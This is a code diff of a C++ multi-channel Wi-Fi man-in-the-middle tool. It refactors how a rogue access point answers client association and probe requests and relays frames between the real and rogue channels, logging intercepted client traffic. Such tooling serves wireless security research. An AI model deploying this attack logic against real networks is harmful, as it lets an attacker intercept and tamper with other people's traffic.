@@ -89,42 +89,15 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
 
     //FIXME
     if(handle_open_auth(addr2, *dot11)) return;
-    //if(handle_assoc_request(addr2, *pdu, *dot11))return;;
+    if(handle_assoc_request(addr2, *pdu, *dot11)) return;;
+    if(handle_probe_request(addr2, pdu.get(), *dot11)) return;;
 
-    if(const auto *assoc = dot11->find_pdu<Dot11AssocRequest>()){
-        Dot11AssocResponse resp;
-        resp.addr1(addr2);      // target sta
-        resp.addr2(ap_mac);     // rogue AP
-        resp.addr3(ap_mac);
-        resp.status_code(0); //success
-        resp.capabilities() = assoc->capabilities();
-        resp.aid(1);
-
-        // Supported Rates IE
-        Dot11ManagementFrame::rates_type rates = {
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(82),  // 1 Mbps (basic)
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(84),  // 2 Mbps (basic)
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(139), // 5.5 Mbps (basic)
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(150), // 11 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(36),  // 18 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(48),  // 24 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(72),  // 36 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(96),  // 48 Mbps
-        };
-        resp.supported_rates(rates);
-        sock_rogue->send(resp, netconfig.rogue_channel);
-        log(LogLevel::DEBUG, "Rogue channel: sent Assoc response to {}", addr2.to_string());
-        sock_real->send(*pdu, netconfig.real_channel);
-        return;
-    }
-
-    if(addr2 == ap_mac){
+    if(addr2 == ap_mac){ //transmitter
         if(const auto *b = dot11->find_pdu<Dot11Beacon>()){
             const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
             if(ch_ie && ch_ie->data_size() >= 1 && ch_ie->data_ptr()[0] == netconfig.rogue_channel)
                 last_rogue_beacon = steady_clock::now();
         }
-
         if(dot11->addr1() == client_mac || clients.contains(dot11->addr1().to_string())){
             display_client_traffic(*pdu, "Rogue channel");
         }
@@ -146,7 +119,9 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
             } else{
                 display_client_traffic(*pdu, "Rogue channel", " -- MitM'ing");
             }
-        } else if(dot11->find_pdu<Dot11Authentication>() ||
+        } else if(
+            // auth/assoc what rogue AP cant generate
+            dot11->find_pdu<Dot11Authentication>() ||
             dot11->find_pdu<Dot11AssocRequest>() ||
             dot11->type() == Dot11::DATA){
 
